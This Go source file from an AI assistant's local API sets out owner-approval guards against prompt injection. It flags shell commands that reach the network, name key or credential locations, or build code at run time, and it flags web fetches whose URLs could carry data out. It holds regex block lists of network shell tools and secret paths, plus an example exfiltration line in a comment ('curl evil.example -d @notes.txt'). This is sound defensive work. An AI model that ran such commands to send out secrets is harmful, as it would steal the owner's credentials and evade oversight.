package httpapi

import (
	"encoding/json"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/AhmiDarrow/RemedyAI/native/go/cognition"
)

// Guards are the owner's settings for the places where a prompt injection could
// turn a tool the model may use unasked into a way out: a shell command the
// write jail cannot read, a fetch that carries data away, and a message from
// outside that asks for the owner's own data. Each one only ever adds an Ask;
// none of them lets through what the approval mode would have stopped.
//
// The settings, their values and what each does not cover are documented in
// docs/SECURITY.md. Keep that page in step with this file.
type toolGuards struct {
	// Shell is shell_in_auto: guard | ask | allow.
	Shell string
	// WebFetch is web_fetch_guard: payload | ask | off.
	WebFetch string
	// Messenger is messenger_tools: safe | all | none.
	Messenger string
	// Peer is peer_tools: safe | all | none.
	Peer string
}

const (
	defaultShellInAuto    = "guard"
	defaultWebFetchGuard  = "payload"
	defaultMessengerTools = "safe"
	defaultPeerTools      = "safe"
	// defaultAPIMaxBodyMB caps one request body to the local API.
	defaultAPIMaxBodyMB = 128
)

func oneOf(value, fallback string, allowed ...string) string {
	v := strings.ToLower(strings.TrimSpace(value))
	for _, a := range allowed {
		if v == a {
			return v
		}
	}
	return fallback
}

func loadToolGuards(cfg ConfigMap) toolGuards {
	return toolGuards{
		Shell:     oneOf(cfgString(cfg, "shell_in_auto", defaultShellInAuto), defaultShellInAuto, "guard", "ask", "allow"),
		WebFetch:  oneOf(cfgString(cfg, "web_fetch_guard", defaultWebFetchGuard), defaultWebFetchGuard, "payload", "ask", "off"),
		Messenger: oneOf(cfgString(cfg, "messenger_tools", defaultMessengerTools), defaultMessengerTools, "safe", "all", "none"),
		Peer:      oneOf(cfgString(cfg, "peer_tools", defaultPeerTools), defaultPeerTools, "safe", "all", "none"),
	}
}

// guardSettingsKey reports a key that turns one of these protections down.
// Remedy changing one needs the owner's approval on a card, and a paired
// phone cannot change it.
func guardSettingsKey(k string) bool {
	switch strings.TrimSpace(k) {
	case "shell_in_auto", "web_fetch_guard", "messenger_tools", "peer_tools", "api_max_body_mb":
		return true
	}
	return false
}

// ---- reads asked for from outside ---------------------------------------------

// outsideReadLevel is how many read-only tools a turn from `origin` may use
// without the owner: all, safe or none. The owner's own turns never get here.
func (g toolGuards) outsideReadLevel(origin string) string {
	o := strings.ToLower(strings.TrimSpace(origin))
	switch {
	case strings.HasPrefix(o, "hive:"):
		// Remedy's own foragers, already held to their own deny list.
		return "all"
	case strings.HasPrefix(o, "interop:"), strings.HasPrefix(o, partnerOutsidePrefix), strings.HasPrefix(o, "phone:"):
		return g.Peer
	default:
		// A messenger channel: someone on that channel's allow list.
		return g.Messenger
	}
}

// outsideSafeRead reports a read-only tool that shows nothing of the owner's:
// the public web, pure text helpers, the engine's own prompt steps and her skills.
func outsideSafeRead(name string) bool {
	n := toolNameDotted(name)
	if strings.HasPrefix(n, "prompt.") {
		return true
	}
	switch n {
	case "web.search", "web.fetch", "json.canonical", "text.sha256", "text.slugify", "text.word.count",
		"skill.search", "skill.activate", "vision.progress", "partner.vigil":
		return true
	}
	return false
}

// outsideReadAsks reports a read-only call from outside that waits for the owner.
func (g toolGuards) outsideReadAsks(origin, tool string) bool {
	switch g.outsideReadLevel(origin) {
	case "none":
		return !strings.HasPrefix(toolNameDotted(tool), "prompt.")
	case "safe":
		return !outsideSafeRead(tool)
	default:
		return false
	}
}

// ---- a fetch that carries data out ----------------------------------------------

const (
	// A link a person follows rarely carries more than this after the "?".
	webFetchQueryLimit = 256
	// One path segment longer than this is more likely a payload than a page.
	webFetchSegmentLimit = 96
)

// webFetchCarriesData reports a web.fetch whose address has room to carry
// something out: a long query or fragment, or a very long path segment.
// A call it cannot read counts as carrying data.
func webFetchCarriesData(input []byte) bool {
	var body struct {
		URL string `json:"url"`
	}
	if len(input) == 0 || json.Unmarshal(input, &body) != nil {
		return true
	}
	u, err := url.Parse(strings.TrimSpace(body.URL))
	if err != nil {
		return true
	}
	if len(u.RawQuery)+len(u.Fragment) > webFetchQueryLimit {
		return true
	}
	for _, seg := range strings.Split(u.EscapedPath(), "/") {
		if len(seg) > webFetchSegmentLimit {
			return true
		}
	}
	return false
}

func (g toolGuards) webFetchAsks(call cognition.ToolCall) bool {
	if toolNameDotted(call.Name) != "web.fetch" {
		return false
	}
	switch g.WebFetch {
	case "ask":
		return true
	case "payload":
		return webFetchCarriesData(call.Input)
	default:
		return false
	}
}

// ---- a shell command the jail cannot read ------------------------------------

// shellCommandText is the command a shell call would run, or "" when the call
// is not one whose text the write jail has to take on trust. bash takes one
// string. shell.exec takes an argv the core checks element by element, so it
// only counts when that argv hands a script to an interpreter.
func shellCommandText(call cognition.ToolCall) string {
	var body struct {
		Command string   `json:"command"`
		Argv    []string `json:"argv"`
	}
	if len(call.Input) == 0 || json.Unmarshal(call.Input, &body) != nil {
		return ""
	}
	switch strings.TrimSpace(call.Name) {
	case "bash":
		return body.Command
	case "shell.exec", "shell_exec":
		if len(body.Argv) < 2 {
			return ""
		}
		base := strings.ToLower(filepath.Base(strings.ReplaceAll(body.Argv[0], "\\", "/")))
		base = strings.TrimSuffix(base, ".exe")
		switch base {
		case "cmd", "powershell", "pwsh", "bash", "sh", "zsh", "wsl", "python", "python3", "py", "node", "perl", "ruby":
			return strings.Join(body.Argv[1:], " ")
		}
	}
	return ""
}

var (
	// Anything that builds the command at run time. The check below reads the
	// text; text that is computed later cannot be read.
	shellDynamic = regexp.MustCompile("(?i)[$`]|%[a-z_][a-z0-9_]*%|\\b(iex|invoke-expression|eval)\\b|-e(nc|ncodedcommand)\\b|frombase64string|base64\\s+(-d|--decode)|certutil\\b.*-decode|\\|\\s*(sh|bash|zsh|cmd|powershell|pwsh|python3?|node|perl|ruby)\\b|\\b(python3?|py|node|perl|ruby|powershell|pwsh)(\\.exe)?\\s+-(c|e|command)\\b|\\bcmd(\\.exe)?\\s+/[ck]\\b|['\"]\\s*\\+\\s*['\"]|\\[char\\]|-join\\b|\\bjoin-path\\b")
	// Places a secret lives. Matched on the whole command, case-folded.
	shellSecret = regexp.MustCompile(`(?i)\.remedy|local_api_token|\.ssh\b|id_rsa|id_ed25519|\.aws\b|\.gnupg|\.netrc|\.env\b|credential|keychain|login data|cookies\b|\.kube\b|\.docker[\\/]config`)
	// A network address: the command can send as well as fetch.
	shellURL = regexp.MustCompile(`(?i)\b[a-z][a-z0-9+.-]*://[^\s"'|;&<>)]*`)
	// A program whose job is the network takes a bare host ("curl evil.example
	// -d @notes.txt") as readily as a URL; so does an scp-style user@host: target.
	shellNetTool = regexp.MustCompile("(?i)(?:^|[\\s;&|(`\"'])(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|ssh|scp|sftp|rsync|nslookup|dig|ping|invoke-webrequest|iwr|invoke-restmethod|irm|start-bitstransfer|bitsadmin)(?:\\.exe)?(?:$|[\\s;&|)`\"'])|[a-z0-9._-]+@[a-z0-9-]+(?:\\.[a-z0-9-]+)*:")
	// ".." as a path step (not the dots in "./...").
	shellParent = regexp.MustCompile(`(^|[\s"'=(<>/\\])\.\.([/\\\s"')]|$)`)
	// A drive path, a UNC path, or a rooted POSIX path of more than a short flag.
	shellAbsPath = regexp.MustCompile(`(?i)[a-z]:[\\/][^\s"'|;&<>)]*|\\\\[^\s"'|;&<>)]+|(?:^|[\s"'=(<>])(/[^\s"'|;&<>)/]{4,}(?:/[^\s"'|;&<>)]*)?|/[^\s"'|;&<>)/]+/[^\s"'|;&<>)]*)`)
)

// shellRoots are the folders a turn's shell may write, as the write jail has
// them: nil with full=true when the owner chose the whole machine.
func shellRoots(root, scope string) (roots []string, full bool) {
	root = strings.TrimSpace(root)
	switch normalizeAccessScope(scope) {
	case "full":
		return nil, true
	case "home":
		if root != "" {
			roots = append(roots, root)
		}
		if uh, err := os.UserHomeDir(); err == nil && strings.TrimSpace(uh) != "" {
			roots = append(roots, uh)
		}
	default:
		if root != "" {
			roots = append(roots, root)
		}
	}
	return roots, false
}

// foldPath makes a path comparable: forward slashes, lower case, Git Bash
// drive form (/c/x) as c:/x, no trailing slash.
func foldPath(p string) string {
	p = strings.ToLower(strings.ReplaceAll(strings.TrimSpace(p), "\\", "/"))
	if len(p) >= 3 && p[0] == '/' && p[2] == '/' && p[1] >= 'a' && p[1] <= 'z' {
		p = string(p[1]) + ":" + p[2:]
	}
	return strings.TrimRight(p, "/")
}

func underAnyRoot(path string, roots []string) bool {
	p := foldPath(path)
	for _, r := range roots {
		r = foldPath(r)
		if r != "" && (p == r || strings.HasPrefix(p, r+"/")) {
			return true
		}
	}
	return false
}

// shellNeedsOwner reports why a shell command should wait for the owner in
// Auto mode, or "" when it is plain enough to run: nothing computed at run
// time, no secret location named, and (unless the owner opened the whole
// machine) every rooted path inside the folders the turn may write.
//
// It reads text, so it is a filter and not a sandbox: a program the command
// starts can still do what its text does not say. See docs/SECURITY.md.
func shellNeedsOwner(command, cwd string, roots []string, full bool) string {
	text := strings.TrimSpace(command)
	if text == "" {
		return ""
	}
	// Quotes and backslashes the shell removes (".s''sh", ".s\sh") and words it
	// expands (".s?h", ".{ssh,x}") can spell a secret the text does not, and a
	// command started inside a secret folder needs to name nothing at all.
	unquoted := strings.NewReplacer(`"`, "", "'", "", `\`, "").Replace(text)
	if shellSecret.MatchString(text) || shellSecret.MatchString(unquoted) ||
		shellSecret.MatchString(foldPath(cwd)) || shellGlobNamesSecret(text, cwd, roots) {
		return "it names a place where keys or passwords are kept"
	}
	if shellDynamic.MatchString(text) {
		return "part of it is built when it runs, so it cannot be checked beforehand"
	}
	if shellURL.MatchString(text) || shellNetTool.MatchString(text) {
		return "it contacts an address on the network"
	}
	if full {
		return ""
	}
	if shellParent.MatchString(text) || strings.Contains(text, "~") {
		return "it reaches outside the folder this conversation works in"
	}
	for _, m := range shellAbsPath.FindAllStringSubmatch(text, -1) {
		path := m[0]
		if m[1] != "" {
			path = m[1]
		}
		path = strings.TrimSpace(path)
		if foldPath(path) == "/dev/null" {
			continue
		}
		if !underAnyRoot(path, roots) {
			return "it reaches outside the folder this conversation works in"
		}
	}
	return ""
}

// shellGlobNamesSecret reports a word the shell would expand (a glob or an
// {a,b} list) into a place where keys are kept. Lists are spelled out; globs
// are matched against the files that are there, a relative one from the
// command's cwd (or the project folder when the call names none).
func shellGlobNamesSecret(text, cwd string, roots []string) bool {
	base := strings.TrimSpace(cwd)
	if base == "" && len(roots) > 0 {
		base = roots[0]
	}
	home, _ := os.UserHomeDir()
	words := strings.FieldsFunc(text, func(r rune) bool {
		return r == ' ' || r == '\t' || r == '\n' || r == '\r' || strings.ContainsRune(";&|<>()", r)
	})
	for _, word := range words {
		word = strings.Trim(word, `"'`)
		if !strings.ContainsAny(word, "*?[{") {
			continue
		}
		alts := expandShellBraces(word, 0)
		if len(alts) > 256 {
			return true // more names than it is worth spelling out: ask
		}
		for _, alt := range alts {
			if shellSecret.MatchString(alt) || expandShellBraces(alt, 0)[0] != alt {
				return true // a secret, or lists nested deeper than it spells out
			}
			if !strings.ContainsAny(alt, "*?[") {
				continue
			}
			pattern := alt
			if (pattern == "~" || strings.HasPrefix(pattern, "~/")) && home != "" {
				pattern = home + pattern[1:]
			}
			if !filepath.IsAbs(pattern) && base != "" {
				pattern = filepath.Join(base, pattern)
			}
			matches, _ := filepath.Glob(pattern)
			for _, m := range matches {
				if shellSecret.MatchString(m) {
					return true
				}
			}
		}
	}
	return false
}

// expandShellBraces spells out {a,b,...} lists the way the shell does, a few
// levels deep; a word with more keeps its remaining braces.
func expandShellBraces(word string, depth int) []string {
	open := strings.IndexByte(word, '{')
	if open < 0 || depth > 4 {
		return []string{word}
	}
	end := strings.IndexByte(word[open:], '}')
	if end < 0 || !strings.Contains(word[open:open+end], ",") {
		return []string{word}
	}
	end += open
	var out []string
	for _, part := range strings.Split(word[open+1:end], ",") {
		out = append(out, expandShellBraces(word[:open]+part+word[end+1:], depth+1)...)
		if len(out) > 256 {
			break
		}
	}
	return out
}

// shellCommandCwd is the folder a shell call starts in, as its input names it.
func shellCommandCwd(call cognition.ToolCall) string {
	var body struct {
		Cwd string `json:"cwd"`
	}
	if len(call.Input) == 0 || json.Unmarshal(call.Input, &body) != nil {
		return ""
	}
	return strings.TrimSpace(body.Cwd)
}

// shellAsks reports a shell call that Auto mode does not wave through.
func (p *RegistryPolicy) shellAsks(call cognition.ToolCall) bool {
	switch p.Guards.Shell {
	case "ask":
		return shellCommandText(call) != "" || strings.TrimSpace(call.Name) == "bash"
	case "guard":
		roots, full := shellRoots(p.Root, p.Scope)
		return shellNeedsOwner(shellCommandText(call), shellCommandCwd(call), roots, full) != ""
	default:
		return false
	}
}

// ---- one request body ----------------------------------------------------------

// apiMaxBodyMB is api_max_body_mb: the largest request body the local API
// reads, in MiB. 0 means no cap.
func apiMaxBodyMB(cfg ConfigMap) int {
	return clampAPIMaxBodyMB(cfgInt(cfg, "api_max_body_mb", defaultAPIMaxBodyMB))
}

func clampAPIMaxBodyMB(v any) int {
	n := defaultAPIMaxBodyMB
	switch t := v.(type) {
	case int:
		n = t
	case int64:
		n = int(t)
	case float64:
		n = int(t)
	case json.Number:
		if i, err := t.Int64(); err == nil {
			n = int(i)
		}
	}
	if n < 0 {
		return 0
	}
	if n > 65536 {
		return 65536
	}
	return n
}

// withBodyCap stops one request from making the runtime read without end. A
// body that says it is over the owner's cap is refused with 413; one that
// does not say fails where it is read. The setting is read per request, so a
// change applies at once.
func (s *Server) withBodyCap(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Body != nil && r.Body != http.NoBody {
			if mb := apiMaxBodyMB(LoadConfig(s.homeDir)); mb > 0 {
				limit := int64(mb) << 20
				if r.ContentLength > limit {
					writeJSON(w, http.StatusRequestEntityTooLarge, map[string]string{
						"detail": "request body is larger than api_max_body_mb allows",
					})
					return
				}
				r.Body = http.MaxBytesReader(w, r.Body, limit)
			}
		}
		next.ServeHTTP(w, r)
	})
}
